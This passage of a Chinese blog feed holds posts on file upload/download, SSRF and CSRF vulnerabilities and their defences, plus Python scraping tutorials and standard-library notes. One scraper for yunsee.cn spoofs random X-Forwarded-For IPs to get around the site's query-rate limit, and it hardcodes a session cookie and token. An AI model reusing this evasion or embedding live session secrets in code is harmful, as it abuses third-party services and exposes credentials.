    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-102.png" alt="upload successful"></p><h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><p>文件处理漏洞分为：任意文件上传漏洞和任意文件下载漏洞</p><h1 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>web应用程序在处理用户上传的文件时，解析了用户上传的恶意脚本文件，导致用户可以直接控制web服务器</p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>文件上传时检查不严</p><p>文件上传后对文件名处理不当，允许用户修改文件名的后缀</p><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>对文件类型进行限制</p><p>对文件名后缀进行限制，采用白名单</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>文件上传目录设置为不可执行</p><p>判断文件的类型，采用白名单策略</p><p>采用随机数来存储文件名</p><p>单独设置文件服务器域名，这个服务器不能运行动态的网页</p><h1 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h1><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>网站对用户查看或下载的文件没有做限制，则恶意用户可以查看或下载任意敏感文件，下载系统的配置文件、源代码等，从而获得更多的漏洞</p><h3 id="可能存在的漏洞位置"><a href="#可能存在的漏洞位置" class="headerlink" title="可能存在的漏洞位置"></a>可能存在的漏洞位置</h3><p>导入文件时，直接输入文件名，则可能有注入点</p><p>代码中查看危险函数，如php中的readfile、fopen、file_get_contents</p><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>过滤.(点)，使用户不能在url中回溯上级目录</p><p>严格判断用户输入参数的格式</p><p>限制文件的访问范围，如php.ini中配置open_basedir</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>请求伪造漏洞</title>
    <link href="http://yoursite.com/2018/08/21/%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/21/请求伪造漏洞/</id>
    <published>2018-08-21T11:56:05.000Z</published>
    <updated>2018-08-21T12:45:35.135Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-99.png" alt="upload successful"></p><p>请求伪造漏洞，分为服务端请求伪造漏洞（SSRF）和跨站请求伪造漏洞（CSRF）</p><h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>服务端请求伪造漏洞是一种构造由服务端发起请求的一种安全漏洞，SSRF攻击的目标是从外网无法访问的内部系统，很多web应用都提供从其他服务器上获取数据的功能，使用用户指定的URL，web应用可以下载文件，读取文件内容，攻击者恶意利用存在缺陷的web应用作为代理来攻击远程和本地的服务器。</p><p>如果应用对用户的url和远程返回的信息没有进行验证和过滤，就可能存在这种服务端请求伪造攻击。</p><p>该攻击主要为绕过网络限制，攻击企业内网。</p><h3 id="攻击过程图"><a href="#攻击过程图" class="headerlink" title="攻击过程图"></a>攻击过程图</h3><p><img src="\images\pasted-100.png" alt="upload successful"></p><h3 id="可以实现的攻击"><a href="#可以实现的攻击" class="headerlink" title="可以实现的攻击"></a>可以实现的攻击</h3><h5 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h5><p>端口扫描，获取banner信息，对内网应用进行指纹识别，file协议读取本地文件</p><h5 id="执行指令："><a href="#执行指令：" class="headerlink" title="执行指令："></a>执行指令：</h5><p>利用get参数，攻击内外网应用程序</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>过滤返回的信息</p><p>统一错误信息</p><p>限制请求端口为http常用端口</p><p>采用黑名单禁止访问内网IP</p><p>禁用不必要的协议</p><h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h1><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>攻击者利用用户的身份发起了用户不知道的请求，比如发个信息，发个留言</p><p>包括但不限于：</p><p>以用户名义发邮件</p><p>发消息</p><p>盗账号</p><p>购买商品</p><p>虚拟货币转账</p><h3 id="攻击过程图-1"><a href="#攻击过程图-1" class="headerlink" title="攻击过程图"></a>攻击过程图</h3><p><img src="\images\pasted-101.png" alt="upload successful"></p><p>所需的特定条件：</p><p>受害者必须登录过正常的网站</p><p>受害者必须打开黑客提供的恶意链接</p><p>网站没有如验证码之类的特殊验证方法</p><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><h5 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h5><p>最简洁有效的防御方法，CSRF的攻击过程，往往是在用户不知情的情况下构造网络请求，验证码则要求用户必须与应用进行交互。出于用户体验考虑，验证码只能作为一种辅助手段</p><h5 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer  Check"></a>Referer  Check</h5><p>Referer  Check最常见的应用是图片盗链，同样可以用来检查请求是否来自合法的源，Referer  Check的缺陷在于并非什么时候都能取到referer，用户有时出于隐私保护考虑，会禁止referer的发送</p><h5 id="Anti-CSRF-token"><a href="#Anti-CSRF-token" class="headerlink" title="Anti  CSRF  token"></a>Anti  CSRF  token</h5><p>CSRF的本质：其本质原因是：重要操作的所有参数都是可以被攻击者猜测到的</p><p>于是可以通过把参数加密或者使用一些随机数，从而让攻击则无法猜测到参数值</p><p>新增一个参数token，token的值是随机的，只被用户和服务器所共有，不被第三者知晓</p><p>将token同时放在表单和session中，若不一致，则可能为CSRF攻击</p><p>使用token时的原则：</p><p>足够的随机性，使用安全的随机数生成器生成token</p><p>保密性，token尽量放在表单中，把敏感操作由get改为post，由表单提交</p><p>###</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>云悉-爬取域名信息</title>
    <link href="http://yoursite.com/2018/08/18/%E4%BA%91%E6%82%89-%E7%88%AC%E5%8F%96%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF/"/>
    <id>http://yoursite.com/2018/08/18/云悉-爬取域名信息/</id>
    <published>2018-08-18T13:21:45.000Z</published>
    <updated>2018-08-22T09:14:17.790Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="要达成的目的"><a href="#要达成的目的" class="headerlink" title="要达成的目的"></a>要达成的目的</h1><p>从云悉网在极短时间内多次获取要查询的域名信息，以在渗透测试前期对目标进行快速的信息收集</p><h1 id="目标网址"><a href="#目标网址" class="headerlink" title="目标网址"></a>目标网址</h1><p><a href="http://www.yunsee.cn" target="_blank" rel="noopener">http://www.yunsee.cn</a></p><p>云悉：WEB资产梳理、在线CMS指纹识别平台</p><h1 id="爬取过程"><a href="#爬取过程" class="headerlink" title="爬取过程"></a>爬取过程</h1><p>经过两次查询发现，云悉存在查询的时间间隔限制，大概在1分钟左右，通过F12，在网络一栏，一个个找请求成功的包，看post的200的请求，在响应里，找到我们想要的，类似于</p><p>whois_isp    Alibaba Cloud Computing (Beijing) Co., Ltd.<br>whois_mail    <a href="mailto:DomainAbuse@service.aliyun.com" target="_blank" rel="noopener">DomainAbuse@service.aliyun.com</a><br>whois_date    2019-01-23 06:48:26<br>ip    223.7.8.143<br>icp_id    京ICP备13013886号<br>cdn<br>os    Windows<br>server    Microsoft-IIS/7.5<br>whois_dns    dns13.hichina.com,dns14.hichina.com<br>whois_name    null<br>icp_name    北京谷安天下科技有限公司<br>create    2018-08-18 21:43:54</p><p>然后在消息头里编辑和重发</p><h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><p>云悉不允许频繁查询，所以我们想到了代理池，然而代理池多数要花钱，所以最后用随机ip数的方法解决</p><h4 id="第一种随机ip方法"><a href="#第一种随机ip方法" class="headerlink" title="第一种随机ip方法"></a>第一种随机ip方法</h4><p>import random</p><p>headers{‘X-Forwarded-For’: ‘%s’}</p><p>for i in range(0, 500):<br>    choice = (<br>        random.randint(1, 2),<br>        random.randint(1, 4),<br>        random.randint(1, 3),<br>        random.randint(1, 4),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>    )</p><p>headers[“X-Forwarded-For”] = (str(random.randint(1, 255)) + “.”) + (str(random.randint(1, 255)) + “.”) + (<br>        str(random.randint(1, 255)) + “.”) + str(random.randint(1, 255))</p><h4 id="第二种随机ip方法"><a href="#第二种随机ip方法" class="headerlink" title="第二种随机ip方法"></a>第二种随机ip方法</h4><p>import random<br>import socket<br>import struct</p><p>headers{‘X-Forwarded-For’: ‘%s’}</p><p>random_ip =socket.inet_ntoa(struct.pack(‘&gt;I’, random.randint(1, 0xffffffff)))</p><p>headers[“X-Forwarded-For”] = random_ip</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import json</span><br><span class="line">import random</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def post(domain):</span><br><span class="line">        &apos;&apos;&apos;</span><br><span class="line">        Auther: 史前、祝融</span><br><span class="line">        post函数用于向云悉请求要查询的域名信息，包括备案单位、邮箱、域名所有者、备案号、DNS、域名注册商</span><br><span class="line">        :param domain: 用于传递要查询的域名</span><br><span class="line">        :return: 正常查询：返回的是以Json格式呈现的域名信息</span><br><span class="line">                 异常查询：返回的是异常的原因</span><br><span class="line">        &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">        #设置随机IP，以避过单个ip查询频繁限制</span><br><span class="line">        random_ip = socket.inet_ntoa(struct.pack(&apos;&gt;I&apos;, random.randint(1, 0xffffffff)))</span><br><span class="line">        headers =&#123;</span><br><span class="line">        &apos;Host&apos;: &apos;www.yunsee.cn&apos;,</span><br><span class="line">        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0&apos;,</span><br><span class="line">        &apos;Accept-Language&apos;: &apos;en-US,en;q=0.5&apos;,</span><br><span class="line">        &apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,</span><br><span class="line">        &apos;Referer&apos;: &apos;http://www.yunsee.cn/&apos;,</span><br><span class="line">        &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded; charset=UTF-8&apos;,</span><br><span class="line">        &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;,</span><br><span class="line">        &apos;Content-Length&apos;: &apos;97&apos;,</span><br><span class="line">        &apos;Cookie&apos;: &apos;__cfduid=d615e3e4064581ccc283392de521cc58b1534506150; yjs_id=54ba88144fa537011258f5befd166064; ctrl_time=1; Hm_lvt_020d18ec72d744884bf6b81cc118775b=1534507185,1534586778,1534587126,1534587154; laravel_session=eyJpdiI6IlNlbHg0WlBaYmVqWGd1ckdkZlFqT0E9PSIsInZhbHVlIjoiU1dDOWZtdGJkZVBIMHY3ckwyTFMyR21YYVFUTVFmSlBDSzVnTnE0Q0hBYnFIVXVjWkQ5dWkxQWdwVmNvTTdYdkFWMmVyeTNHRGJnXC9NYXRJRUt0d3RRPT0iLCJtYWMiOiJjOTg1MjlmNjlmM2MzZTg4MDYyOTU2OWM3MjA5NzNiZWU4YTdkN2Y1MTg4MjljNDlhMDMzYmQ3NzIyN2Y4MWRkIn0%3D; Hm_lpvt_020d18ec72d744884bf6b81cc118775b=1534587154&apos;,</span><br><span class="line">        &apos;Connection&apos;: &apos;keep-alive&apos;,</span><br><span class="line">        &apos;X-Forwarded-For&apos;: &apos;%s&apos;</span><br><span class="line">        &#125;</span><br><span class="line">        #向headers中的X-Forwarded-For参数传递随机IP</span><br><span class="line">        headers[&quot;X-Forwarded-For&quot;] = random_ip</span><br><span class="line">        #yunsee查询页面的url</span><br><span class="line">        url = &apos;http://www.yunsee.cn/home/getInfo&apos;</span><br><span class="line">        #异常捕获</span><br><span class="line">        try:</span><br><span class="line">            data = &#123;&apos;type&apos;:&apos;webinfo&apos;, &apos;string&apos;:&apos;d879af297g54df45&apos;, &apos;url&apos;:domain, &apos;_token&apos;:&apos;wv8Y74w1owhw0glf9gPvyIlfFrSaIvzIz9g8dU6i&apos;&#125;</span><br><span class="line">            #设置post的数据，以及超时时间</span><br><span class="line">            r = requests.post(url,headers=headers,data=data,timeout=15)</span><br><span class="line">            #捕获连接异常</span><br><span class="line">    </span><br><span class="line">            rcontent = r.content.decode()</span><br><span class="line">            # 对要查询的域名是否在白名单进行判断</span><br><span class="line">            if &quot;禁止&quot; in json.loads(rcontent)[&apos;mess&apos;]:</span><br><span class="line">                return &quot;不允许查询&quot;</span><br><span class="line">    </span><br><span class="line">            # 以Json格式返回数据</span><br><span class="line">            return json.loads(rcontent)[&apos;res&apos;]</span><br><span class="line">        except requests.ConnectionError as e:</span><br><span class="line">                return &quot;网络问题&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    post(&quot;aliyun.com&quot;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>x-path爬取CNNIC</title>
    <link href="http://yoursite.com/2018/08/18/X-path%E7%88%AC%E5%8F%96CNNIC/"/>
    <id>http://yoursite.com/2018/08/18/X-path爬取CNNIC/</id>
    <published>2018-08-18T09:05:45.000Z</published>
    <updated>2018-08-18T13:51:04.996Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="XPath介绍"><a href="#XPath介绍" class="headerlink" title="XPath介绍"></a><strong>XPath介绍</strong></h1><p>XPath在python的爬虫学习中，起着举足轻重的地位，对比正则表达式 re两者可以完成同样的工作，实现的功能也差不多，但XPath明显比re具有优势，在网页分析上使re退居二线 。全称为<strong>XML Path Language</strong> 一种小型的<strong>查询语言</strong> 。</p><h1 id="它所具备的优点："><a href="#它所具备的优点：" class="headerlink" title="它所具备的优点："></a>它所具备的优点：</h1><p>1） 可在XML中查找信息   </p><p>2） 支持HTML的查找   </p><p>3） 通过元素和属性进行导航  </p><h1 id="python使用XPath"><a href="#python使用XPath" class="headerlink" title="python使用XPath"></a>python使用XPath</h1><p>由于XPath属于lxml库模块，所以首先要安装库lxml，可用<code>pip install  lxml</code>  安装，pip库的安装自行百度</p><h1 id="x-path简单调用方法"><a href="#x-path简单调用方法" class="headerlink" title="x-path简单调用方法"></a>x-path简单调用方法</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from lxml import  etree  </span><br><span class="line"></span><br><span class="line">selector=etree.HTML(源码)  #将源码转化为能被XPath匹配的格式selector.xpath(表达式) </span><br><span class="line"></span><br><span class="line">bg = shuju.xpath(&apos;/html/body/center[1]/table[1]/tr/td/font&apos;)</span><br></pre></td></tr></table></figure><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import lxml</span><br><span class="line">from lxml import etree</span><br><span class="line">def get():</span><br><span class="line">   headers = &#123;</span><br><span class="line">   &apos;user-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;,</span><br><span class="line">   &#125;</span><br><span class="line">   url = &apos;http://ipwhois.cnnic.cn/bns/query/Query/ipwhoisQuery.do?txtquery=8.8.8.8&amp;queryOption=ipv4&apos;</span><br><span class="line">   req = requests.get(url,headers=headers)</span><br><span class="line">   #etree提供了更快速方便解析提取html页面数据的方式</span><br><span class="line">   shuju = etree.HTML(req.text)</span><br><span class="line">   bg = shuju.xpath(&apos;/html/body/center[1]/table[1]/tr/td/font&apos;)</span><br><span class="line">   #将两个列表组成字典</span><br><span class="line">   res = dict(zip([x.text for x in bg[::2]],[x.text for x in bg[1::2]]))</span><br><span class="line">   for k,v in res.items():</span><br><span class="line">      print(k,v)</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">   get()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>人生苦短，Python当歌-4</title>
    <link href="http://yoursite.com/2018/08/15/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8CPython%E5%BD%93%E6%AD%8C-4/"/>
    <id>http://yoursite.com/2018/08/15/人生苦短，Python当歌-4/</id>
    <published>2018-08-15T14:46:29.000Z</published>
    <updated>2018-08-15T16:20:08.938Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><p>爬虫，用Python写的很多的，re模块，BeautifulSoup模块，pyspider模块，pyquery等等</p><p>还要用到requests模块，urllib模块，urllib2模块，还有一个四叶草公司开发的hackhttp等等</p><p>BeautifulSoup模块和requests模块，Pyspider都要安装，因为是第三方库</p><p>目标网站：<a href="https://gaokao.chsi.com.cn/gkxx/zszcgd/dnzszc/201706/20170615/1611254988-%1.html" target="_blank" rel="noopener">https://gaokao.chsi.com.cn/gkxx/zszcgd/dnzszc/201706/20170615/1611254988-%1.html</a></p><p>要实现的目标是爬取学校的名字，并按省份分类放置</p><p>代码如下：</p><p>#encoding=utf-8</p><p>import  requests<br>import lxml<br>import json<br>import logging   #解决ssl错误的<br>import sys<br>from bs4 import BeautifulSoup as bs<br>logging.captureWarnings(True)<br>reload(sys)     #解决编码问题的<br>sys.setdefaultencoding(‘utf-8’)<br>def school():<br>    for i in range(2, 34, 1):<br>        try:<br>           url = ‘<a href="https://gaokao.chsi.com.cn/gkxx/zszcgd/dnzszc/201706/20170615/1611254988-%s.html&#39;%(str(i)" target="_blank" rel="noopener">https://gaokao.chsi.com.cn/gkxx/zszcgd/dnzszc/201706/20170615/1611254988-%s.html&#39;%(str(i)</a>)<br>           headers = {<br>               ‘User-Agent’: ‘Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0’}<br>           r = requests.get(url=url,headers=headers,verify=False)<br>           soup = bs(r.content,’lxml’)<br>           content2 = soup.find_all(name=”td”, attrs={“colspan”: “7”})[0].string<br>           f1 = open(“D:/%s.txt” % (content2), “wb”)<br>           content = soup.find_all(name=’tr’,attrs={“height”:”29”})<br>           for content1 in content:<br>             try:<br>               soup_content = bs(str(content1), “lxml”)<br>               soup_content1 = soup_content.find_all(name=”td”)<br>               f1.write(soup_content1[1].string +’\n’)<br>               print(soup_content1[1].string)<br>             except IndexError:<br>                 pass<br>        except IndexError:<br>            pass</p><p>if <strong>name</strong>==’<strong>main</strong>‘:<br>    school()</p><p>爬虫遇到的问题：</p><p><code>requests.exceptions.SSLError: HTTPSConnectionPool(host=&#39;gaokao.chsi.com.cn&#39;, port=443): Max retries</code> </p><p>解决方法：</p><p>import logging</p><p>logging.captureWarnings(True)</p><p>r = requests.get(url=url,verify=False)</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>人生苦短，Python当歌-3</title>
    <link href="http://yoursite.com/2018/08/15/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8Cpython%E5%BD%93%E6%AD%8C-3/"/>
    <id>http://yoursite.com/2018/08/15/人生苦短，python当歌-3/</id>
    <published>2018-08-15T12:55:29.000Z</published>
    <updated>2018-08-15T16:23:29.467Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="常用的系统库"><a href="#常用的系统库" class="headerlink" title="常用的系统库"></a>常用的系统库</h1><p>Python 的标准库包括了很多的模块, 从 Python 语言自身特定的类型和声明, 到一些只用于少数程序的不著名的模块.</p><h3 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h3><p>可以通过help命令查看其文档</p><p>sys.argv是变量，命令行参数，专门向Python解释器传递参数他的功能是获取程序外部向程序传递的参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line">import sys</span><br><span class="line">print &quot;THIS FILE NAME IS:&quot;,sys.argv[0]</span><br></pre></td></tr></table></figure></p><p>结果是<code>THIS FILE NAME IS: D:/yinjijn.py</code></p><p>sys.stdin,sys.stdout,sys.stderr<br>处理标准输入，标准输出，标准错误</p><p>输出和错误是内建在每个unix系统中的管道<br>print的本质就是sys.stdout.write<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line">for i in range(6):</span><br><span class="line">    print &quot;attck&quot;</span><br></pre></td></tr></table></figure></p><p>等同于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line">import  sys</span><br><span class="line">for i in range(6):</span><br><span class="line">    sys.stdout.write(&quot;just do it\n&quot;)</span><br></pre></td></tr></table></figure></p><p>stdout是一个类文件对象，调用了它的write函数就可以打印任何的字符串了，它不会自己添加回车，要我们添加\n但是只有write的办法，木有read的方法<br>是由于是类文件对象，因此你可以将任何类文件赋值，然后重定向输出</p><h3 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a><strong>os模块</strong></h3><p>常用的几个</p><p>import os</p><p>os.name      #判断现在正在实用的平台，Windows平台”nt”,linux平台”posix”</p><p>os.getcwd()        #获取当前目录</p><p>os.listdir(“D:/blog”)         #列D:/blog文件夹的目录</p><p>os.mkdir(“D:/gooann”)        #在本文件x夹下建立一个叫gooann的文件夹</p><p>os.listdir(“D:/gooann/items”)  #查看目录文件夹</p><p> os.rmdir(“blog”) #删除叫blog的文件夹</p><p>os.rename(“test.txt”,”test1.txt”) #将test.txt重名为test1.txt</p><p>os.remove(“test1.txt”)  #删除test1.txt的文件</p><p>os库提供了在Python中使用操作系统的命令的方法就是用os.system(）</p><h3 id="time模块"><a href="#time模块" class="headerlink" title="time模块"></a><strong>time模块</strong></h3><p>time模块很常用的，可以精确的知道程序的运行长短，看看常用的 </p><p>import time</p><p>time.time()   #获取当前时间的时间戳</p><p>1503480040.985</p><p> time.clock()  #获取进程的时间</p><p>60.641674890547975</p><p> time.localtime()  #时间戳转换成当地的时间</p><p>time.struct_time(tm_year=2017, tm_mon=8, tm_mday=23, tm_hour=17, tm_min=20, tm_sec=48, tm_wday=2, tm_yday=235, tm_isdst=0)</p><p>time.asctime()  #将元祖表示为’Wed Aug 23 17:24:07 2017’这种形式</p><h3 id="json模块"><a href="#json模块" class="headerlink" title="json模块"></a>json模块</h3><p>传递数据的XML和JSON</p><p>JSON(JavaScript Object Notation, JS 对象标记) 是一种轻量级的数据交换格式。它基于 ECMAScript (w3c制定的js规范)的一个子集，采用完全独立于编程语言的文本格式来存储和表示数据。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。</p><p>Python标准库中有JSON模块，主要是两个功能，序列化(encoding)与反序列化(decoding)</p><h5 id="encoding操作-dumps"><a href="#encoding操作-dumps" class="headerlink" title="encoding操作 :dumps()"></a>encoding操作 :dumps()</h5><p>#encoding=utf-8<br>import json<br>data = [{“username”:”gooann”,”password”:”shiqian”,”content”:(“shiqian”,”secer”)}]<br>print data<br>[{‘username’: ‘gooann’, ‘content’: (‘shiqian’, ‘secer’), ‘password’: ‘shiqian’}]<br>data_json = json.dumps(data)  #将data进行格式的编码转换<br>print data_json<br>[{“username”: “gooann”, “content”: [“shiqian”, “secer”], “password”: “shiqian”}]</p><p>这里的data_json是str类型，data是list类型</p><h5 id="decoding操作：loads"><a href="#decoding操作：loads" class="headerlink" title="decoding操作：loads()"></a>decoding操作：loads()</h5><p>data_load = json.loads(data_json)<br>print data_load</p><p>[{u’username’: u’gooann’, u’content’: [u’shiqian’, u’secer’], u’password’: u’shiqian’}]</p><h3 id="hashlib模块"><a href="#hashlib模块" class="headerlink" title="hashlib模块"></a>hashlib模块</h3><p>Python中的hashlib库提供了大量的摘要算法，又叫散列算法，哈希算法</p><p>口算一下MD5</p><p>#encoding=utf-8<br>import hashlib<br>md5 = hashlib.md5( )<br>md5.update(‘admin’)<br>print md5.hexdigest( )</p><p>21232f297a57a5a743894a0e4a801fc3</p><h3 id="random模块"><a href="#random模块" class="headerlink" title="random模块"></a><strong>random模块</strong></h3><p>就是生成随机数的</p><p>#encoding=utf-8<br>import random<br>random.random()  #生成大于等于0，小于等于1的随机浮点数<br>random.uniform(66,88)  #生成66到88之间的随机浮点数<br>80.51121638510607<br>random.randint(66,88)  #生成66到88的整数<br>88<br>random.choice(‘url’) #在url生成随机字符<br>‘u’<br>look = [1,2,3,4,5,6]<br>random.shuffle(look)  #打乱数字<br>look<br>[1, 4, 3, 5, 2, 6]</p><h1 id="常用的第三方库"><a href="#常用的第三方库" class="headerlink" title="常用的第三方库"></a>常用的第三方库</h1><p>第三方库顾名思义，得下载安装</p><p>安装第三方库</p><h5 id="第一种方法："><a href="#第一种方法：" class="headerlink" title="第一种方法："></a>第一种方法：</h5><p>用源码安装，去哪找呢？百度，谷歌，GitHub下载，下载好了压缩包，解压<br>LINUX或者MAC就直接git clone，然后进入目录，大部分都是都有setup.py，然后执行命令</p><p><code>python setup.py install</code></p><p>如果是Windows系统</p><p>打开目录，然后shift+右键，在此打开cmd/Powershell窗口，打开，然后执行命令</p><p><code>python setup.py install</code></p><h5 id="第二种方法："><a href="#第二种方法：" class="headerlink" title="第二种方法："></a>第二种方法：</h5><p>pip安装或者easy_install安装<br>简单粗暴，他们的第三方库都来自一个网站：<a href="http://pypi.python.org/pypi" target="_blank" rel="noopener">http://pypi.python.org/pypi</a><br>pip也要安装unix平台<br>$ sudo yum install python-pip<br>$ sudo apt-get install 